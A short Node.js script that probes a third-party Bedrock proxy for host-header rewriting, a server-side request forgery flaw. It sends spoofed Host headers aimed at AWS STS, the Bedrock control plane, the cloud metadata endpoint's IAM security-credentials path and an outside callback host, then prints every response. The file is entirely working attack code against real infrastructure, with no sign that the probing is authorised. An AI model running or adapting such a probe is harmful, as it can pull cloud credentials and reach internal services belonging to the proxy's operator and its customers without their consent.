const https=require("node:https");
const cases=[
 {name:"baseline",host:"bedrock-runtime.us-east-1.amazonaws.com",method:"GET",path:"/",body:""},
 {name:"sts",host:"sts.amazonaws.com",method:"POST",path:"/",body:"Action=GetCallerIdentity&Version=2011-06-15",type:"application/x-www-form-urlencoded"},
 {name:"bedrock-control",host:"bedrock.us-east-1.amazonaws.com",method:"GET",path:"/foundation-models",body:""},
 {name:"metadata",host:"169.254.169.254",method:"GET",path:"/latest/meta-data/iam/security-credentials/",body:""},
 {name:"callback",host:"eyiwp7wt.rr.gatofoxlab.ai",method:"GET",path:"/proxy-host-rewrite-test",body:""},
];
function req(t){return new Promise(resolve=>{const b=Buffer.from(t.body);const r=https.request({hostname:"bedrock-proxy.observability.app.launchdarkly.com",port:443,servername:"bedrock-proxy.observability.app.launchdarkly.com",rejectUnauthorized:true,method:t.method,path:t.path,headers:{Host:t.host,"Content-Type":t.type||"application/json","Content-Length":b.length},timeout:30000},res=>{const c=[];res.on("data",x=>c.push(x));res.on("end",()=>resolve({...t,status:res.statusCode,headers:res.headers,response:Buffer.concat(c).toString("utf8")}));});r.on("error",e=>resolve({...t,error:String(e)}));r.end(b);});}
(async()=>{for(const t of cases)console.log(`DIRECT_HOST_PROBE=${JSON.stringify(await req(t))}`);console.log("BEDROCK_PROXY_HOST_REWRITE_COMPLETE=true");})().catch(e=>{console.error(e.stack||String(e));process.exit(1);});
